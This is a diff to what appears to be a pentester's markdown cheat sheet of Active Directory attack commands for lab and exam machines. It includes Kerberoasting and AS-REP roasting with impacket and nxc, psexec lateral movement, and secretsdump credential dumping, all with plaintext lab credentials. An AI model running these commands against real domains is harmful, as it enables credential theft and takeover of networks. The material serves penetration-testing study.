@@ -1,4 +1,4 @@
-# POR SSL WINRM
+**POR SSL WINRM
 ```bash
 https://github.com/ozelis/winrmexec
 
@@ -106,6 +106,8 @@ nxc ldap 172.16.0.2 -u 'calde_ldap' -p 'CsAdlLDAPMoDeBrnd12!' --asreproast  a.tx
 
 ```bash
 impacket-GetUserSPNs certified.htb/judith.mader:judith09 -request
+
+faketime -f "+7h" impacket-GetUserSPNs oscp.exam/Eric.Wallows:'EricLikesRunning800' -dc-ip 10.10.202.146 -request
 ```
 
 ## NTLM = FALSE
@@ -163,6 +165,8 @@ kdestroy
 
 ```ruby
 impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.175 cmd.exe
+
+impacket-psexec -dc-ip 192.168.112.175 -k -no-pass resourcedc.resourced.local
 ```
 
 ## Pedir ticket
@@ -284,4 +288,3 @@ python3 ticketConverter.py ticket.kirbi ticket.ccache
 
 impacket-secretsdump -k -no-pass 'darkzero.htb/DC01$@DC01.darkzero.htb'
 ```
-
